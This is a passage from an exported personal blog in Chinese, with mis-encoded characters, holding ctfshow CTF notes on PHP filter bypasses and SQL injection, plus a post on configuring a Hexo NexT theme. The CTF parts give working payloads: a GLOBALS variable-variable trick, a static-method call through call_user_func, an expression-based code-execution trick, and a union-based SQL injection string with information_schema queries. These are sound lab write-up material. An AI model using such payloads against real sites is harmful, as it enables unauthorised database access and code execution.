invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<p>?v2&#x3D;GLOBALS&amp;v1&#x3D;ctfshow</p>
<h2 id="phpfuzz"><a href="#phpfuzz" class="headerlink" title="phpfuzz"></a>phpfuzz</h2><p>web115</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($num)&#123;</span><br><span class="line">    $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num);</span><br><span class="line">    return $num;</span><br><span class="line">&#125;</span><br><span class="line">$num=$_GET[&#x27;num&#x27;];</span><br><span class="line">if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27; and filter($num)==&#x27;36&#x27;)&#123;</span><br><span class="line">    if($num==&#x27;36&#x27;)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;hacker!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!!!&quot;;</span><br><span class="line">&#125; hacker!!!</span><br></pre></td></tr></table></figure>

<p>fuzzè„šæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for($i = 0; $i&lt;129; $i++)&#123;</span><br><span class="line">	$num=chr($i).&#x27;36&#x27;;</span><br><span class="line">	if(trim($num)!==&#x27;36&#x27; &amp;&amp; is_numeric($num) &amp;&amp; $num!==&#x27;36&#x27;)&#123;</span><br><span class="line">		echo urlencode(chr($i)).&quot;\n&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="é™æ€ç±»è°ƒç”¨"><a href="#é™æ€ç±»è°ƒç”¨" class="headerlink" title="é™æ€ç±»è°ƒç”¨"></a>é™æ€ç±»è°ƒç”¨</h2><p>â€‹         web137 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class ctfshow</span><br><span class="line">&#123;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        die(&quot;private class&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    static function getFlag()&#123;</span><br><span class="line">        echo file_get_contents(&quot;flag.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">call_user_func($_POST[&#x27;ctfshow&#x27;]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>phpä¸­ -&gt;ä¸:: è°ƒç”¨ç±»ä¸­çš„æˆå‘˜çš„åŒºåˆ«<br>-&gt;ç”¨äºåŠ¨æ€è¯­å¢ƒå¤„ç†æŸä¸ªç±»çš„æŸä¸ªå®ä¾‹<br>::å¯ä»¥è°ƒç”¨ä¸€ä¸ªé™æ€çš„ã€ä¸ä¾èµ–äºå…¶ä»–åˆå§‹åŒ–çš„ç±»æ–¹æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow=ctfshow::getFlag</span><br></pre></td></tr></table></figure>

<p><strong>åœ¨PHPä¸­ï¼Œ0&#x3D;&#x3D;&#x3D;FALSEæ˜¯é”™è¯¯çš„</strong> ä¸æ˜¯å¼ºç­‰äº</p>
<p>stripos() å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®</p>
<p>preg_matchä¸è¯†åˆ«æ•°ç»„</p>
<p>stripos()å‡½æ•°å¯¹æ•°ç»„ä¸è¯†åˆ«ï¼Œé‡åˆ°æ•°ç»„ä¼šè¿”å›false</p>
<h2 id="ç»•è¿‡returnçš„æ–¹å¼"><a href="#ç»•è¿‡returnçš„æ–¹å¼" class="headerlink" title="ç»•è¿‡returnçš„æ–¹å¼"></a>ç»•è¿‡returnçš„æ–¹å¼</h2><p>phpä¸­æœ‰ä¸ªæœ‰æ„æ€çš„åœ°æ–¹ï¼Œæ•°å­—æ˜¯å¯ä»¥å’Œå‘½ä»¤è¿›è¡Œä¸€äº›è¿ç®—çš„ï¼Œä¾‹å¦‚ <code>1-phpinfo();</code>ç»“åˆå‡å·æ˜¯å¯ä»¥æ‰§è¡Œphpinfo()å‘½ä»¤çš„ã€‚ï¼ˆä¸ä¸€å®šæ˜¯å‡å·ï¼Œè¿˜æœ‰åŠ ã€ä¹˜ã€é™¤å·ï¼Œè‹¥ç”¨åŠ å·ã€‚è¦ç”¨<code>+</code>ï¼Œè¦è¿›è¡ŒURLç¼–ç ï¼Œè¿™æ˜¯ä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œä¸è¿›è¡Œç¼–ç ä¼šå½“ä½œç©ºæ ¼ï¼‰</p>
]]></content>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>åšå®¢åˆ›å»º</title>
    <url>/2023/01/11/%E5%8D%9A%E5%AE%A2%E5%88%9B%E5%BB%BA/</url>
    <content><![CDATA[<p> layout å¸ƒç½®<br>    <span id="more"></span></p>
<h1 id="æ–‡ç« å­—æ•°ç»Ÿè®¡"><a href="#æ–‡ç« å­—æ•°ç»Ÿè®¡" class="headerlink" title="æ–‡ç« å­—æ•°ç»Ÿè®¡"></a>æ–‡ç« å­—æ•°ç»Ÿè®¡</h1><h3 id="Hexo-config-yml"><a href="#Hexo-config-yml" class="headerlink" title="Hexo _config.yml"></a>Hexo _config.yml</h3><p>åœ¨æ–‡ä»¶å°¾éƒ¨æ·»åŠ </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">symbols_count_time:</span><br><span class="line">  symbols: true</span><br><span class="line">  time: true</span><br><span class="line">  total_symbols: true</span><br><span class="line">  total_time: true</span><br><span class="line">  exclude_codeblock: false</span><br><span class="line">  awl: 4</span><br><span class="line">  wpm: 275</span><br><span class="line">  suffix: &quot;mins.&quot;</span><br></pre></td></tr></table></figure>

<h3 id="NexT-config-yml"><a href="#NexT-config-yml" class="headerlink" title="NexT _config.yml"></a>NexT _config.yml</h3><p>ä¿®æ”¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Post wordcount display settings</span><br><span class="line"># Dependencies: https://github.com/next-theme/hexo-word-counter</span><br><span class="line">symbols_count_time:</span><br><span class="line">  separated_meta: true</span><br><span class="line">  item_text_total: false</span><br></pre></td></tr></table></figure>

<p>è®¾ç½®<code>item_text_total</code>ä¸º<code>true</code></p>
<h1 id="æ‰“èµåŠŸèƒ½å®ç°"><a href="#æ‰“èµåŠŸèƒ½å®ç°" class="headerlink" title="æ‰“èµåŠŸèƒ½å®ç°"></a>æ‰“èµåŠŸèƒ½å®ç°</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Donate (Sponsor) settings</span><br><span class="line"># Front-matter variable (unsupport animation).</span><br><span class="line">reward_settings:</span><br><span class="line">  # If true, a donate button will be displayed in every article by default.</span><br><span class="line">  enable: false</span><br><span class="line">  animation: false</span><br><span class="line">  #comment: Buy me a coffee</span><br><span class="line"></span><br><span class="line">reward:</span><br><span class="line">  #wechatpay: /images/wechatpay.png</span><br><span class="line">  #alipay: /images/alipay.png</span><br><span class="line">  #paypal: /images/paypal.png</span><br><span class="line">  #bitcoin: /images/bitcoin.png</span><br></pre></td></tr></table></figure>

<p>è®¾ç½®å±æ€§<code>enable</code>ä¸º<code>true</code>ï¼Œ<code>animation</code>ä¸º<code>true</code>ï¼Œæ·»åŠ <code>comment</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enable: true</span><br><span class="line">comment: Buy me a coffee</span><br></pre></td></tr></table></figure>

<p>å°†å¾®ä¿¡æ”¯ä»˜å’Œæ”¯ä»˜å®æ”¯ä»˜çš„æˆªå›¾æ”¾ç½®åœ¨ä¸»é¢˜åŒ…ä¸‹<code>source/images</code>æ–‡ä»¶å¤¹ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wechatpay: /images/wechatpay.jpg</span><br><span class="line">alipay: /images/alipay.jpg</span><br><span class="line">#bitcoin: /images/bitcoin.jpg</span><br></pre></td></tr></table></figure>

<h1 id="live2d"><a href="#live2d" class="headerlink" title="live2d"></a>live2d</h1><h3 id="å®‰è£…æ’ä»¶"><a href="#å®‰è£…æ’ä»¶" class="headerlink" title="å®‰è£…æ’ä»¶"></a>å®‰è£…æ’ä»¶</h3><p>npm install â€“save hexo-helper-live2d</p>
<h3 id="ä¸‹è½½modelæ–‡ä»¶"><a href="#ä¸‹è½½modelæ–‡ä»¶" class="headerlink" title="ä¸‹è½½modelæ–‡ä»¶"></a>ä¸‹è½½modelæ–‡ä»¶</h3><p>npm install live2d-widget-model-shizuku</p>
<h4 id="æ·»åŠ live2dçœ‹æ¿å¨˜åˆ°hexo"><a href="#æ·»åŠ live2dçœ‹æ¿å¨˜åˆ°hexo" class="headerlink" title="æ·»åŠ live2dçœ‹æ¿å¨˜åˆ°hexo"></a>æ·»åŠ live2dçœ‹æ¿å¨˜åˆ°hexo</h4><p>é…ç½®Hexoçš„ä¸»<code>_config.yml</code>æˆ–è€…ä½¿ç”¨çš„ä¸»é¢˜çš„<code>_config.yml</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">## Live2Dçœ‹æ¿å¨˜</span><br><span class="line">live2d:</span><br><span class="line">  enable: true</span><br><span class="line">  pluginModelPath: assets/</span><br><span class="line">  model:</span><br><span class="line">    #æ¨¡æ¿ç›®å½•ï¼Œåœ¨node_modulesé‡Œ</span><br><span class="line">    use: live2d-widget-model-shizuku  </span><br><span class="line">  display:</span><br><span class="line">    position: right</span><br><span class="line">    width: 300 </span><br><span class="line">    height: 600</span><br><span class="line">  mobile:</span><br><span class="line">    # åœ¨æ‰‹æœºç«¯æ˜¾ç¤º</span><br><span class="line">    show: false   </span><br><span class="line">  rect:</span><br><span class="line">    opacity:0.7</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a href="https://hexo-next.readthedocs.io/zh_CN/latest/">å…­è§’å½¢-NexT (hexo-next.readthedocs.io)</a></p>
<p><a href="https://markdown.com.cn/basic-syntax/">Markdown åŸºæœ¬è¯­æ³• | Markdown å®˜æ–¹æ•™ç¨‹</a></p>
<h1 id="çˆ±å¿ƒç‰¹æ•ˆ"><a href="#çˆ±å¿ƒç‰¹æ•ˆ" class="headerlink" title="çˆ±å¿ƒç‰¹æ•ˆ"></a>çˆ±å¿ƒç‰¹æ•ˆ</h1><p><a href="https://benn314.github.io/2022/11/22/Hexo-Next%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/#%E9%BC%A0%E6%A0%87%E7%82%B9%E5%87%BB%E5%8A%A8%E7%94%BB">Hexo-Nextä¸»é¢˜é…ç½®æ•™ç¨‹ | Benâ€™s Blog (benn314.github.io)</a></p>
<p>åœ¨ <strong>&#x2F;themes&#x2F;next&#x2F;source&#x2F;js&#x2F;</strong> ä¸‹æ–°å»ºæ–‡ä»¶ <code>clicklove.js</code> å¹¶æ·»åŠ ä»£ç ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!function(e,t,a)&#123;function n()&#123;c(&quot;.heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: &#x27;&#x27;;width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;&quot;),o(),r()&#125;function r()&#123;for(var e=0;e&lt;d.length;e++)d[e].alpha&lt;=0?(t.body.removeChild(d[e].el),d.splice(e,1)):(d[e].y--,d[e].scale+=.004,d[e].alpha-=.013,d[e].el.style.cssText=&quot;left:&quot;+d[e].x+&quot;px;top:&quot;+d[e].y+&quot;px;opacity:&quot;+d[e].alpha+&quot;;transform:scale(&quot;+d[e].scale+&quot;,&quot;+d[e].scale+&quot;) rotate(45deg);background:&quot;+d[e].color+&quot;;z-index:99999&quot;);requestAnimationFrame(r)&#125;function o()&#123;var t=&quot;function&quot;==typeof e.onclick&amp;&amp;e.onclick;e.onclick=function(e)&#123;t&amp;&amp;t(),i(e)&#125;&#125;function i(e)&#123;var a=t.createElement(&quot;div&quot;);a.className=&quot;heart&quot;,d.push(&#123;el:a,x:e.clientX-5,y:e.clientY-5,scale:1,alpha:1,color:s()&#125;),t.body.appendChild(a)&#125;function c(e)&#123;var a=t.createElement(&quot;style&quot;);a.type=&quot;text/css&quot;;try&#123;a.appendChild(t.createTextNode(e))&#125;catch(t)&#123;a.styleSheet.cssText=e&#125;t.getElementsByTagName(&quot;head&quot;)[0].appendChild(a)&#125;function s()&#123;return&quot;rgb(&quot;+~~(255*Math.random())+&quot;,&quot;+~~(255*Math.random())+&quot;,&quot;+~~(255*Math.random())+&quot;)&quot;&#125;var d=[];e.requestAnimationFrame=function()&#123;return e.requestAnimationFrame||e.webkitRequestAnimationFrame||e.mozRequestAnimationFrame||e.oRequestAnimationFrame||e.msRequestAnimationFrame||function(e)&#123;setTimeout(e,1e3/60)&#125;&#125;(),n()&#125;(window,document);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åœ¨ <strong>\themes\next\layout_layout.njk</strong> æ–‡ä»¶æœ«å°¾æ·»åŠ ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- é¡µé¢ç‚¹å‡»å°çº¢å¿ƒ --&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;/js/src/clicklove.js&quot;&gt;&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="é¼ æ ‡è·Ÿéšç‰¹æ•ˆ"><a href="#é¼ æ ‡è·Ÿéšç‰¹æ•ˆ" class="headerlink" title="é¼ æ ‡è·Ÿéšç‰¹æ•ˆ"></a>é¼ æ ‡è·Ÿéšç‰¹æ•ˆ</h1><p><a href="https://sweetolive.github.io/2020/07/17/1/">Hexo nextä¸»é¢˜æ·»åŠ é¼ æ ‡ç‰¹æ•ˆ | ä½˜ä¸€äºº (sweetolive.github.io)</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(function cherry() &#123;</span><br><span class="line">  var possibleColors = [&quot;#D61C59&quot;, &quot;#E7D84B&quot;, &quot;#1B8798&quot;]</span><br><span class="line">  var width = window.innerWidth;</span><br><span class="line">  var height = window.innerHeight;</span><br><span class="line">  var cursor = &#123;x: width/2, y: width/2&#125;;</span><br><span class="line">  var particles = [];</span><br><span class="line">  </span><br><span class="line">  function init() &#123;</span><br><span class="line">    bindEvents();</span><br><span class="line">    loop();</span><br><span class="line">  &#125;  </span><br><span class="line">  // Bind events that are needed</span><br><span class="line">  function bindEvents() &#123;</span><br><span class="line">    document.addEventListener(&#x27;mousemove&#x27;, onMouseMove);</span><br><span class="line">    document.addEventListener(&#x27;touchmove&#x27;, onTouchMove);</span><br><span class="line">    document.addEventListener(&#x27;touchstart&#x27;, onTouchMove);</span><br><span class="line">    </span><br><span class="line">    window.addEventListener(&#x27;resize&#x27;, onWindowResize);</span><br><span class="line">  &#125;  </span><br><span class="line">  function onWindowResize(e) &#123;</span><br><span class="line">    width = window.innerWidth;</span><br><span class="line">    height = window.innerHeight;</span><br><span class="line">  &#125; </span><br><span class="line">  function onTouchMove(e) &#123;</span><br><span class="line">    if( e.touches.length &gt; 0 ) &#123;</span><br><span class="line">      for( var i = 0; i &lt; e.touches.length; i++ ) &#123;</span><br><span class="line">        addParticle( e.touches[i].clientX, e.touches[i].clientY, possibleColors[Math.floor(Math.random()*possibleColors.length)]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  function onMouseMove(e) &#123;    </span><br><span class="line">    cursor.x = e.clientX;</span><br><span class="line">    cursor.y = e.clientY;</span><br><span class="line">    </span><br><span class="line">    addParticle( cursor.x, cursor.y, possibleColors[Math.floor(Math.random()*possibleColors.length)]);</span><br><span class="line">  &#125;</span><br><span class="line">  function addParticle(x, y, color) &#123;</span><br><span class="line">    var particle = new Particle();</span><br><span class="line">    particle.init(x, y, color);</span><br><span class="line">    particles.push(particle);</span><br><span class="line">  &#125;</span><br><span class="line">  function updateParticles() &#123;</span><br><span class="line">    for( var i = 0; i &lt; particles.length; i++ ) &#123;</span><br><span class="line">      particles[i].update();</span><br><span class="line">    &#125;</span><br><span class="line">    for( var i = particles.length -1; i &gt;= 0; i-- ) &#123;</span><br><span class="line">      if( particles[i].lifeSpan &lt; 0 ) &#123;</span><br><span class="line">        particles[i].die();</span><br><span class="line">        particles.splice(i, 1);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  function loop() &#123;</span><br><span class="line">    requestAnimationFrame(loop);</span><br><span class="line">    updateParticles();</span><br><span class="line">  &#125;</span><br><span class="line">  function Particle() &#123;</span><br><span class="line">    this.character = &quot;*&quot;;</span><br><span class="line">    this.lifeSpan = 120; //ms</span><br><span class="line">    this.initialStyles =&#123;</span><br><span class="line">      &quot;position&quot;: &quot;fixed&quot;,</span><br><span class="line">      &quot;top&quot;: &quot;0&quot;, //å¿…é¡»åŠ </span><br><span class="line">      &quot;display&quot;: &quot;block&quot;,</span><br><span class="line">      &quot;pointerEvents&quot;: &quot;none&quot;,</span><br><span class="line">      &quot;z-index&quot;: &quot;10000000&quot;,</span><br><span class="line">      &quot;fontSize&quot;: &quot;20px&quot;,</span><br><span class="line">      &quot;will-change&quot;: &quot;transform&quot;</span><br><span class="line">    &#125;;</span><br><span class="line">    this.init = function(x, y, color) &#123;</span><br><span class="line">      this.velocity = &#123;</span><br><span class="line">        x:  (Math.random() &lt; 0.5 ? -1 : 1) * (Math.random() / 2),</span><br><span class="line">        y: 1</span><br><span class="line">      &#125;;</span><br><span class="line">      this.position = &#123;x: x - 10, y: y - 20&#125;;</span><br><span class="line">      this.initialStyles.color = color;</span><br><span class="line">      console.log(color);</span><br><span class="line"></span><br><span class="line">      this.element = document.createElement(&#x27;span&#x27;);</span><br><span class="line">      this.element.innerHTML = this.character;</span><br><span class="line">      applyProperties(this.element, this.initialStyles);</span><br><span class="line">      this.update();</span><br><span class="line">      </span><br><span class="line">      document.body.appendChild(this.element);</span><br><span class="line">    &#125;;</span><br><span class="line">    this.update = function() &#123;</span><br><span class="line">      this.position.x += this.velocity.x;</span><br><span class="line">      this.position.y += this.velocity.y;</span><br><span class="line">      this.lifeSpan--;</span><br><span class="line">      this.element.style.transform = &quot;translate3d(&quot; + this.position.x + &quot;px,&quot; + this.position.y + &quot;px,0) scale(&quot; + (this.lifeSpan / 120) + &quot;)&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    this.die = function() &#123;</span><br><span class="line">      this.element.parentNode.removeChild(this.element);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  function applyProperties( target, properties ) &#123;</span><br><span class="line">    for( var key in properties ) &#123;</span><br><span class="line">      target.style[ key ] = properties[ key ];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  init();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<h4 id="åœ¨themes-next-layoutæ–°å»ºæ–‡ä»¶å¤¹-custom"><a href="#åœ¨themes-next-layoutæ–°å»ºæ–‡ä»¶å¤¹-custom" class="headerlink" title="åœ¨themes\next\layoutæ–°å»ºæ–‡ä»¶å¤¹_custom"></a>åœ¨themes\next\layoutæ–°å»ºæ–‡ä»¶å¤¹_custom</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%- if theme.cursor_effect %&#125;</span><br><span class="line">  &#123;%- if theme.cursor_effect.type == &quot;explosion&quot; %&#125;</span><br><span class="line">    &lt;canvas class=&quot;fireworks&quot; style=&quot;position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;&quot; &gt;&lt;/canvas&gt;</span><br><span class="line">    &lt;script src=&quot;//cdn.bootcss.com/animejs/2.2.0/anime.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;/js/cursor/explosion.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &#123;%- elseif theme.cursor_effect.type == &quot;cherry&quot; %&#125;</span><br><span class="line">    &lt;script src=&quot;/js/cursor/cherry.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &#123;%- endif %&#125;</span><br><span class="line">&#123;%- endif %&#125;</span><br></pre></td></tr></table></figure>

<h4 id="åœ¨themes-next-layoutä¸‹æ‰¾åˆ°-layout-swigï¼Œæ·»åŠ ä¸‹é¢ä»£ç "><a href="#åœ¨themes-next-layoutä¸‹æ‰¾åˆ°-layout-swigï¼Œæ·»åŠ ä¸‹é¢ä»£ç " class="headerlink" title="åœ¨themes\next\layoutä¸‹æ‰¾åˆ°_layout.swigï¼Œæ·»åŠ ä¸‹é¢ä»£ç "></a>åœ¨themes\next\layoutä¸‹æ‰¾åˆ°_layout.swigï¼Œæ·»åŠ ä¸‹é¢ä»£ç </h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% include &#x27;_custom/custom.swig&#x27; %&#125;</span><br></pre></td></tr></table></figure>

<h4 id="æœ€ååœ¨ä¸»é¢˜é…ç½®æ–‡ä»¶-config-ymlï¼Œæ·»åŠ ä¸‹é¢ä»£ç ï¼Œtypeé€‰æ‹©ä¸åŒç‰¹æ•ˆ"><a href="#æœ€ååœ¨ä¸»é¢˜é…ç½®æ–‡ä»¶-config-ymlï¼Œæ·»åŠ ä¸‹é¢ä»£ç ï¼Œtypeé€‰æ‹©ä¸åŒç‰¹æ•ˆ" class="headerlink" title="æœ€ååœ¨ä¸»é¢˜é…ç½®æ–‡ä»¶_config.ymlï¼Œæ·»åŠ ä¸‹é¢ä»£ç ï¼Œtypeé€‰æ‹©ä¸åŒç‰¹æ•ˆ"></a>æœ€ååœ¨ä¸»é¢˜é…ç½®æ–‡ä»¶_config.ymlï¼Œæ·»åŠ ä¸‹é¢ä»£ç ï¼Œtypeé€‰æ‹©ä¸åŒç‰¹æ•ˆ</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># cherry: æ¨±èŠ± | explosionï¼šçˆ†ç‚¸ </span><br><span class="line">cursor_effect:</span><br><span class="line">  enabled: true</span><br><span class="line">  type: cherry </span><br></pre></td></tr></table></figure>

<h2 id="è®¾ç½®é€æ˜åº¦"><a href="#è®¾ç½®é€æ˜åº¦" class="headerlink" title="è®¾ç½®é€æ˜åº¦"></a>è®¾ç½®é€æ˜åº¦</h2><p>å•ç‹¬ç»™æ¯ä¸ªåŒºåŸŸè®¾ç½®opacityä¼šå‡ºç°å¾ˆå¤šé—®é¢˜ï¼Œä¾‹å¦‚æœç´¢æ¡†å¼¹å‡ºä¼šè¢«è¦†ç›–å›¾å±‚å¯¼è‡´æ— æ³•è¿›è¡Œæœ¬åœ°æœç´¢</p>
<p>æœ€ç†æƒ³æ˜¯è¿›è¡Œå…¨å±€è®¾ç½®ï¼Œåœ¨ <code>blog\source\_data\styles.styl</code> ä¸­ ç›´æ¥è®¾ç½®bodyçš„é€æ˜åº¦ä¸º0.85 å…¨ä½“é€æ˜åŒ–ï¼Œopacityçš„å€¼å¯ä»¥è‡ªè¡Œè°ƒæ•´</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//èƒŒæ™¯å›¾ç‰‡è®¾ç½®</span><br><span class="line">body &#123;</span><br><span class="line">    background-image: url(/images/bg1.jpg);</span><br><span class="line">    background-repeat: no-repeat;</span><br><span class="line">    background-attachment: fixed;</span><br><span class="line">    background-size: 100% 100%;</span><br><span class="line">    opacity: 0.85;</span><br><span class="line">    //å¯é€‰</span><br><span class="line">    +mobile()&#123;</span><br><span class="line">      background-image: url(https://ziyuan.lruihao.cn/images/bg_cell.png);</span><br><span class="line">      background-size: cover;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="æ¨±èŠ±é£˜è½ç‰¹æ•ˆ"><a href="#æ¨±èŠ±é£˜è½ç‰¹æ•ˆ" class="headerlink" title="æ¨±èŠ±é£˜è½ç‰¹æ•ˆ"></a>æ¨±èŠ±é£˜è½ç‰¹æ•ˆ</h1><p><a href="https://bobboss.github.io/posts/ac603ad1.html">æ¨±èŠ±é£˜è½ç‰¹æ•ˆ | BobBoss Blog</a></p>
<h2 id="rsaåŠ å¯†é—®é¢˜"><a href="#rsaåŠ å¯†é—®é¢˜" class="headerlink" title="rsaåŠ å¯†é—®é¢˜"></a>rsaåŠ å¯†é—®é¢˜</h2><p>[(15æ¡æ¶ˆæ¯) è§£å†³<a href="mailto:&#103;&#105;&#116;&#x40;&#103;&#105;&#116;&#x68;&#x75;&#98;&#46;&#99;&#x6f;&#109;">&#103;&#105;&#116;&#x40;&#103;&#105;&#116;&#x68;&#x75;&#98;&#46;&#99;&#x6f;&#109;</a>: Permission denied (publickey). Could not read from remote repository_ywl470812087çš„åšå®¢-CSDNåšå®¢](<a href="https://blog.csdn.net/ywl470812087/article/details/104459288?ops_request_misc=%7B%22request_id%22:%22168481639316800197061390%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168481639316800197061390&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-104459288-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=">https://blog.csdn.net/ywl470812087/article/details/104459288?ops_request_misc=%7B%22request%5Fid%22%3A%22168481639316800197061390%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=168481639316800197061390&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-104459288-null-null.142^v87^control_2,239^v2^insert_chatgpt&amp;utm_term=</a> Could not read from remote repository&amp;spm&#x3D;1018.2226.3001.4187)</p>
]]></content>
      <categories>
        <category>åšå®¢</category>
      </categories>
      <tags>
        <tag>åšå®¢</tag>
      </tags>
  </entry>
  <entry>
    <title>easysql</title>
    <url>/2023/03/23/%E7%AE%80%E5%8D%95sql/</url>
    <content><![CDATA[<p> æˆ‘æ˜¯èœç‹—ã€‚</p>
  <span id="more"></span>

<p>[toc]</p>
<h2 id="mysql-information-schema"><a href="#mysql-information-schema" class="headerlink" title="mysql-information_schema"></a>mysql-information_schema</h2><p>æŸ¥çœ‹æ•°æ®åº“ï¼Œåœ¨<strong>schemata</strong>è¡¨ä¸­ï¼Œ<strong>schema_name</strong>å­—æ®µä¸­</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select schema_name from information_schema.schemata</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹æ•°æ®åº“çš„è¡¨å ï¼Œåœ¨<strong>tables</strong>è¡¨ä¸­ï¼Œ<strong>table_name</strong>å­—æ®µä¸­</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=&#x27;æ•°æ®åº“å&#x27;</span><br></pre></td></tr></table></figure>

<p>çŒœè¡¨çš„åˆ—åï¼Œåœ¨<strong>columns</strong>è¡¨ä¸­ï¼Œ<strong>column_name</strong>å­—æ®µä¸­</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Select column_name from information_schema.columns where table_name=&#x27;æ•°æ®è¡¨å&#x27;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.cnblogs.com/Lee-404/p/12833788.html">æ— åˆ—åæ³¨å…¥ - Lee-404 - åšå®¢å›­ (cnblogs.com)</a></p>
<h2 id="union-è”åˆæ³¨å…¥"><a href="#union-è”åˆæ³¨å…¥" class="headerlink" title="union è”åˆæ³¨å…¥"></a>union è”åˆæ³¨å…¥</h2><p>ä¾æ¬¡åˆ¤æ–­ç±»å‹ï¼Œå­—æ®µæ•°ï¼Œå›æ˜¾ç‚¹ï¼Œä¾æ¬¡çˆ†åº“åï¼Œè¡¨åï¼Œå­—æ®µåï¼Œæ•°æ®<br>unionæœ‰ä¸€ä¸ªååˆ†ä¸¥æ ¼çš„çº¦æŸæ¡ä»¶ï¼Œå› ä¸ºæ˜¯è”åˆæŸ¥è¯¢ï¼Œå¿…é€‰ä¿è¯å­—æ®µæ•°ä¸€è‡´ï¼Œå³ä¸¤ä¸ªæŸ¥è¯¢ç»“æœæœ‰ç›¸åŒçš„åˆ—æ•°ï¼Œå› æ­¤æˆ‘ä»¬è¦å¯¹å­—æ®µæ•°è¿›è¡Œåˆ¤æ–­</p>
<p>ctfshow web2;</p>
<p>æŸ¥çœ‹å½“å‰æ•°æ®åº“åç§°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 union select 1,database(),3 limit 1,2;#-- </span><br></pre></td></tr></table></figure>

